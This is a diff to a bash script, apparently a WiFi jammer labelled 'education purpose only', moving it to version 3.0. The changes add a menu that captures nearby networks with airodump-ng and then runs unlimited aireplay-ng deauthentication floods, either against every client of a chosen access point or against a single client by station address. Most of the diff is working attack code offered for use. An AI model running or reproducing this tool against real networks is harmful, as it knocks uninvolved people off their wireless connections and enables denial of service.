@@ -14,13 +14,26 @@ echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |_
 echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  /"
 echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
 echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\ "
-
+echo ""
+echo ""
+echo "                                  WRITTEN BY                                "
+echo ""
+echo ""
+echo "                               ,d                                            "
+echo "                               88                                            "
+echo "           88,dPYba,,adPYba, MM88MMM 88,dPYba,,adPYba,         8b,    ,d8 "
+echo "           88P     88      8a  88     88P   88      8a  aaaaaaaa Y8, ,8P  "
+echo "           88      88      88  88     88    88      88  aaaaaaaa  )888(   "
+echo "           88      88      88  88,    88    88      88          ,d8   8b, "
+echo "           88      88      88   Y888  88    88      88         8P       Y8"
+echo ""
+echo "                                    GitHub                               "
+echo ""
 echo -e "${ENDCOLOR}"
 echo -e "${GREEN}"
 echo "--------------------------------------------------------------------------------"
-echo "------------------------  Wrtten by @mtm-x (GitHub) ----------------------------"
 echo "----------------------Education purpose only for gods sake----------------------"
-echo "--------------------------------Versio-2.0--------------------------------------"
+echo "--------------------------------Versio-3.0--------------------------------------"
 echo -e "${ENDCOLOR}"
 
 echo -e "${ITALICYELLOW}"
@@ -28,14 +41,16 @@ echo -e "${ITALICYELLOW}"
 echo "--------------------------------------------------------------------------------"
 echo "------------------------------------USAGE---------------------------------------"
 echo "---                        Starts moniter interface                          ---"
-echo "---                        Runs airodump-ng                                  ---"
-echo "---                        Deauthenticates specified AP                      ---"
+echo "---                            Runs airodump-ng                              ---"
+echo "---                     Deauthenticates whole Access point                   ---"
+echo "---            Deauthenticates specified client of the Access point          ---"
 echo "---                        revert make to managed mode                       ---"
 echo "--------------------------------------------------------------------------------"
 echo "------------------------------------NOTE----------------------------------------"
 echo "---                             Use small y/n                                ---"
 echo "--------------------------------------------------------------------------------"
-echo "=============================Press enter to continue============================"
+echo "===========================Press enter to continue============================"
+echo "=========================== Press ctrl + c to exit ============================"
 echo -e "${ENDCOLOR}"
 echo ""
 read START
@@ -159,14 +174,13 @@ cleanup() {
     echo "  B)    bb    Y)    E)          B)    bb    Y)    E)       "
     echo "  B)bbbbb     Y)    E)eeeeee    B)bbbbb     Y)    E)eeeeee "
     echo -e "${ENDCOLOR}"
-    sleep 4
+    sleep 2
     exit 0
 }
 
 
 
-# Trap SIGINT signal (Ctrl+C)
-trap cleanup SIGINT
+
 
 
 # Check for root permissions
@@ -224,30 +238,39 @@ function_mon() {
     print_color_text "$CYAN" "Starting monitoring..."
     print_color_text "$CYAN" "-------------------------"
     sleep 2
-    print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
-    print_color_text "$YELLOW" " Dumping network traffic. Wait for 15 seconds it will automatically quit "
-    print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
-    sleep 5
+    print_color_text "$YELLOW" "---------------------------------------------------------------------------"
+    print_color_text "$YELLOW" " Dumping network traffic. Wait for some moments (Press ctrl + c to stop)"
+    print_color_text "$YELLOW" "---------------------------------------------------------------------------"
+    sleep 1
+    print_color_text "$YELLOW" "----------------------------------------------------------------------"
+    print_color_text "$YELLOW" " Check dump.csv file in the same directory of the script if necessary "
+    print_color_text "$YELLOW" "----------------------------------------------------------------------"
 
-    # Start airodump-ng in the background
-    print_color_text "$CYAN" "---------------------------"
-    print_color_text "$CYAN" "Dumping network traffic..."
-    print_color_text "$CYAN" "---------------------------"
-    sleep 2
-    airodump-ng "$wire" &
-    airodump_pid=$!
-    sleep 15
-    kill "$airodump_pid"
+    # Set a trap to handle Ctrl+C (SIGINT) for airodump-ng
+    trap  SIGINT
+
+    # Run airodump-ng in the foreground
+    airodump-ng -w dump --output-format csv $wire 
+
+
+    # Once airodump-ng is terminated, reset the trap and continue
+    trap - SIGINT
+
     echo ""
-    sleep 2
-
-    print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
-    print_color_text "$YELLOW" " Would you like to specify a network to target for deauthentication? (y/n): "
-    print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
+    sleep 1
+    print_color_text "$YELLOW" "------------------"
+    print_color_text "$YELLOW" " Please select: "
+    print_color_text "$YELLOW" "------------------"
+    print_color_text "$GREEN" "
+                               1. Knock all the clients from the access point 
+                               2. Knock a specific client from the access point
+                               3. Skip"
+    echo "Select [1,2,3]"
     read -r DEAUTH_OPTION
-
-    if [[ $DEAUTH_OPTION == 'y' ]]; then
-        print_color_text "$YELLOW" "-------------------------------------------"
+    trap cleanup SIGINT
+    case $DEAUTH_OPTION in 
+    
+    1)  print_color_text "$YELLOW" "-------------------------------------------"
         print_color_text "$YELLOW" "Please enter the BSSID of the network: "
         print_color_text "$YELLOW" "-------------------------------------------"
         read -r BSSID
@@ -266,6 +289,7 @@ function_mon() {
         print_color_text "$YELLOW" "Starting deauthentication attack on BSSID: $BSSID, Channel: $CHANNEL..."
         print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
         sleep 2
+        trap cleanup SIGINT
         aireplay-ng --deauth 0 -a "$BSSID" "$wire" &
         clear
         deauth_pid=$!
@@ -274,15 +298,57 @@ function_mon() {
         print_color_text "$YELLOW" "Press Ctrl+C to stop the deauthentication attack and revert to managed mode..."
         print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
         wait "$deauth_pid"
+        cleanup
+        ;;
+   
+    2)  print_color_text "$YELLOW" "-------------------------------------------"
+        print_color_text "$YELLOW" "Please enter the BSSID of the network: "
+        print_color_text "$YELLOW" "-------------------------------------------"
+        read -r BSSID
+        sleep 1
+        print_color_text "$YELLOW" "-------------------------------------------"
+        print_color_text "$YELLOW" "Please enter the channel of the network: "
+        print_color_text "$YELLOW" "-------------------------------------------"
+        read -r CHANNEL
+        print_color_text "$YELLOW" "--------------------------------------------------"
+        print_color_text "$YELLOW" "Please enter the station address of the client: "
+        print_color_text "$YELLOW" "--------------------------------------------------"
+        read -r STATION
 
-    else
-        print_color_text "$RED" "-----------------------------------"
+        # Set the channel
+        iwconfig "$wire" channel "$CHANNEL"
+        sleep 1
+
+        # Launch deauthentication attack
+        print_color_text "$YELLOW" "---------------------------------------------------------------------------------------------"
+        print_color_text "$YELLOW" "Starting deauthentication attack on Client: $STATION, BSSID: $BSSID , Channel: $CHANNEL..."
+        print_color_text "$YELLOW" "----------------------------------------------------------------------------------------------"
+        sleep 2
+        trap cleanup SIGINT
+        aireplay-ng --deauth 0 -a "$BSSID" -c $STATION "$wire" & #& for background process
+        clear
+        deauth_pid=$! #$! returns the process id of aireplay
+        # Wait for user to terminate deauth attack
+        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
+        print_color_text "$YELLOW" "Press Ctrl+C to stop the deauthentication attack and revert to managed mode..."
+        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
+        wait "$deauth_pid"
+        cleanup
+    ;;
+
+
+    3)  print_color_text "$RED" "-----------------------------------"
         print_color_text "$RED" "Skipping deauthentication attack."
         print_color_text "$RED" "-----------------------------------"
+        cleanup
+    ;;
 
-    fi
-
-    cleanup
+    *) echo "Invalid entry" >&2
+       cleanup
+       ;;
+       
+    esac 
+    
 }
 
 # Main script execution
